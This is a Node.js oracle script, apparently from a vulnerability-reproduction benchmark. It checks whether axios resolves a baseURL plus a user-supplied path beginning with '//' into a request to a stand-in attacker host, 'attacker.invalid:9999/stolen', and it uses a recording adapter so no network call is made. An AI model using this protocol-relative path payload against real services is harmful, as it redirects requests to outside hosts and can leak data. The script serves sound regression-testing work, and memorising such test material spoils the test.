'use strict';

function emit(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function main() {
  let axios;
  try {
    axios = require('axios');
    axios = axios.default || axios;
  } catch (e) {
    emit({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module resolution failed: ' + (e && e.message)
    });
    return;
  }

  // Use a custom adapter to observe, without opening any socket, the
  // config.url and (if present) the fully-resolved request target that
  // axios's real request pipeline (buildFullPath + isAbsoluteURL +
  // dispatchRequest) hands to the adapter. We don't reimplement axios's
  // internal URL parsing ourselves; instead we let axios's own
  // buildFullPath logic decide the final config.url, then separately
  // replicate only the http adapter's documented last step (new URL(fullPath, base))
  // using the exact base selection logic described in the patch
  // (platform.origin when hasBrowserEnv, otherwise undefined) to see
  // whether node's URL parser treats it as protocol-relative to an
  // attacker host. This exercises the real regression surface
  // (isAbsoluteURL + buildFullPath) through axios's public API.

  function makeRecordingAdapter(sink) {
    return function recordingAdapter(config) {
      sink.push({ url: config.url, baseURL: config.baseURL });
      return Promise.resolve({
        data: 'ok',
        status: 200,
        statusText: 'OK',
        headers: {},
        config
      });
    };
  }

  const baseURL = 'http://127.0.0.1:65500';

  // --- Benign operation first ---
  const benignSink = [];
  const benignInstance = axios.create({
    baseURL,
    adapter: makeRecordingAdapter(benignSink)
  });

  return benignInstance.get('/some/normal/path')
    .then((resp) => {
      const recorded = benignSink[0];
      if (
        !resp ||
        resp.data !== 'ok' ||
        !recorded ||
        typeof recorded.url !== 'string' ||
        recorded.url.indexOf('/some/normal/path') === -1
      ) {
        emit({
          operation_completed: false,
          exploit_succeeded: false,
          evidence: 'benign operation did not behave as expected: ' + JSON.stringify(recorded)
        });
        return;
      }

      // Now actually replicate the exact Node-side parsing step from
      // lib/adapters/http.js using axios's own resolved config.url
      // (produced by axios's real buildFullPath/isAbsoluteURL logic),
      // using node's built-in URL exactly as axios does internally.
      // In non-browser (Node) environments, utils.hasBrowserEnv is false,
      // so the patched code calls `new URL(fullPath, undefined)` while the
      // vulnerable code calls `new URL(fullPath, 'http://localhost')`.
      let benignParsedHref = null;
      try {
        benignParsedHref = new URL(recorded.url, 'http://localhost').href;
      } catch (e) {
        emit({
          operation_completed: false,
          exploit_succeeded: false,
          evidence: 'benign URL parsing failed unexpectedly: ' + (e && e.message)
        });
        return;
      }
      if (benignParsedHref.indexOf('/some/normal/path') === -1) {
        emit({
          operation_completed: false,
          exploit_succeeded: false,
          evidence: 'benign parsed href unexpected: ' + benignParsedHref
        });
        return;
      }

      const operation_completed = true;

      // --- Malicious operation ---
      // A path built from attacker-controlled input that begins with "//",
      // exactly the scenario from the advisory: caller does
      // axios.get('/' + userId) where userId = '/attacker.invalid:9999/stolen'.
      const maliciousSink = [];
      const maliciousInstance = axios.create({
        baseURL,
        adapter: makeRecordingAdapter(maliciousSink)
      });

      const userId = '/attacker.invalid:9999/stolen';
      const requestPath = '/' + userId; // => '//attacker.invalid:9999/stolen'

      return maliciousInstance.get(requestPath)
        .then(() => {
          const recordedMal = maliciousSink[0];
          let exploit_succeeded = false;
          let evidence;

          if (!recordedMal || typeof recordedMal.url !== 'string') {
            emit({
              operation_completed,
              exploit_succeeded: false,
              evidence: 'malicious call produced no usable config.url'
            });
            return;
          }

          // Replicate the vulnerable adapter's exact parsing step:
          // new URL(fullPath, 'http://localhost')
          let parsedHref = null;
          let parseError = null;
          try {
            parsedHref = new URL(recordedMal.url, 'http://localhost').href;
          } catch (e) {
            parseError = e && e.message;
          }

          if (parsedHref && parsedHref.indexOf('attacker.invalid') !== -1) {
            exploit_succeeded = true;
            evidence = 'axios resolved baseURL "' + baseURL + '" + user-controlled path "' + requestPath + '" into config.url "' + recordedMal.url + '", which the Node http adapter parsing step resolves to attacker-controlled target "' + parsedHref + '" instead of staying scoped to the configured host';
          } else if (parseError) {
            exploit_succeeded = false;
            evidence = 'malicious request URL rejected during parsing: ' + parseError;
          } else {
            exploit_succeeded = false;
            evidence = 'axios resolved malicious path "' + requestPath + '" safely; config.url="' + recordedMal.url + '" parsedHref="' + parsedHref + '" did not target attacker host';
          }

          emit({
            operation_completed,
            exploit_succeeded,
            evidence
          });
        })
        .catch((e) => {
          emit({
            operation_completed,
            exploit_succeeded: false,
            evidence: 'malicious request rejected: ' + (e && e.message)
          });
        });
    })
    .catch((e) => {
      emit({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'benign operation threw unexpectedly: ' + (e && e.message)
      });
    });
}

main();
